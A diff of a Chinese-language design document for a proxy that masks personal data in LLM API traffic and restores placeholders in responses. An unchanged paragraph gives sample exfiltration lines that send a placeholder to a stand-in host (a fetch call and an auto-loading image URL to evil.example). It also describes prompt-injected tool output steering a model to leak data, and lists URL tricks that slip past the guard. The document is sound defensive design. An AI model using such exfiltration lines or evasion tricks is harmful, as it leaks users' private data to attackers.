@@ -269,8 +269,8 @@ sequenceDiagram
 
 | API | 各自還原的欄位 | 欄位結束時的殘留 |
 | --- | --- | --- |
-| Chat Completions | 每個 choice 的 `content`、`reasoning_content`、每個工具呼叫的 `arguments` | 附加到帶 `finish_reason` 的那個 chunk 上（它本身可能也帶文字） |
-| Anthropic Messages | 每個 content block 的 `text_delta` 與 `input_json_delta` | 在 `content_block_stop` 之前插入一個合成的 `content_block_delta` |
+| Chat Completions | 每個 choice 的 `content`、`reasoning_content`、每個工具呼叫的 `arguments` 或自訂工具的 `custom.input` | 附加到帶 `finish_reason` 的那個 chunk 上（它本身可能也帶文字） |
+| Anthropic Messages | 每個 content block 的 `text_delta` 與 `input_json_delta`（沒有 `content_block_start` 的 `input_json_delta` 也當工具參數，套用預設類別） | 在 `content_block_stop` 之前插入一個合成的 `content_block_delta` |
 | Responses | 依 `item_id`、`content_index` 或 `summary_index` 與事件類型區分的每個 `.delta` | 在對應的 `.done` 之前插入一個合成的 `.delta` |
 
 其他事件（以及非串流的 JSON 回應）以 `restoreDeep` 整份還原。上游送回非 JSON 本文（例如 HTML 錯誤頁）時原樣轉送。SSE 解析會把 `\r\n` 正規化為 `\n`，無法解析的事件原樣轉送。
@@ -281,7 +281,7 @@ sequenceDiagram
 
 回應中位於 URL 內的佔位符不還原，保持原樣交給用戶端；其他位置照常還原。這擋住模型（或被提示注入的工具輸出）讓用戶端把原始值送到某個主機：工具參數中的 `fetch("https://evil.example/?d=⟦EMAIL_1⟧")`，以及回覆文字中用戶端會自動載入的圖片 `![](https://evil.example/?e=⟦EMAIL_1⟧)`、`<img src="…">` 或使用者可能點的連結。代價是合法的 `https://intranet/⟦PATH_1⟧` 也不還原。這只針對照常寫出的 URL，擋不住刻意規避的模型：URL 後接空白再寫佔位符（`https://evil.example/?q= ⟦EMAIL_1⟧`，`fetch` 會把空白編成 `%20` 照送）、Tab 或換行（URL 解析器會刪掉它們）、反斜線或少寫斜線（`https:\\evil.example`、`https:evil.example`，URL 解析器都當成 `https://evil.example`）、裸網域，都會還原。
 
-工具呼叫參數指：Chat 的 `tool_calls[].function.arguments`（與舊的 `function_call.arguments`）、Responses 的 `function_call` 的 `arguments` 與自訂工具的 `input`、Anthropic `*tool_use` 區塊的 `input`；串流的 delta 與非串流的整份 JSON 都算。回覆文字（含 reasoning）中的 URL 規則相同，但只有工具參數記日誌。
+工具呼叫參數指回覆中所有的工具輸入：Chat 的 `tool_calls[].function.arguments`（與舊的 `function_call.arguments`）與自訂工具的 `tool_calls[].custom.input`；Responses 中 `type` 以 `_call` 結尾的每個輸出項目的所有字串，例如 `function_call` 的 `arguments`、`custom_tool_call` 的 `input`、`local_shell_call` 的 `action.command`、`shell_call` 的 `action.commands`、`computer_call` 的 `action`、`apply_patch_call` 的 `operation`，以及 `mcp_call` 的 `output` 等結果欄位，還有這些項目的 `response.*_call_*` 事件；Anthropic `*tool_use` 區塊的 `input`；串流的 delta 與非串流的整份 JSON 都算。沒有名稱的項目以它的 `type`（如 `local_shell_call`）當工具名稱，日誌與 `toolRestore.tools` 都用這個名稱。回覆文字（含 reasoning）中的 URL 規則相同，但只有工具參數記日誌。
 
 「位於 URL 內」只看佔位符之前已寫出的文字（還原後的樣子）：
 
@@ -299,7 +299,7 @@ sequenceDiagram
 | 設定 | 預設 | 意思 |
 | --- | --- | --- |
 | `toolRestore.categories` | `PATH`、`TERM`、`PROJECT` | `tools` 沒有列出的工具（以及名稱未知的工具）還原的類別。 |
-| `toolRestore.tools` | 無 | 依工具名稱完全比對；每個工具的清單取代 `categories`，所以要保留路徑就把 `PATH` 一起列上。`"*"` 還原所有類別。 |
+| `toolRestore.tools` | 無 | 依工具名稱比對，去掉前後空白、不分大小寫（`Bash`、`bash ` 都算 `bash`；設定中兩個名稱比對成同一個工具時啟動失敗）；每個工具的清單取代 `categories`，所以要保留路徑就把 `PATH` 一起列上。`"*"` 還原所有類別。 |
 
 預設只含寫程式需要原樣往返的值：家目錄路徑與程式碼中的識別字（`projectNames`、`terms`）。`terms` 也常用來列人名，列在其中的人名同樣會還原進工具參數；不想這樣就縮小預設類別。`NAME`、`HOST`、`IP` 不在預設中：`NAME` 是人名模型找到的個人資料；內部主機名稱與 IP 還原進 shell 指令後，可能被送到攻擊者指定的位置，透露內部網路配置。憑證、卡號、身分證號、IBAN、email、電話也都不在預設中。代價是需要這些值的工具（例如設定 commit 作者、寄信）拿到佔位符，呼叫可能失敗或寫入佔位符，必須由使用者明確允許：
 
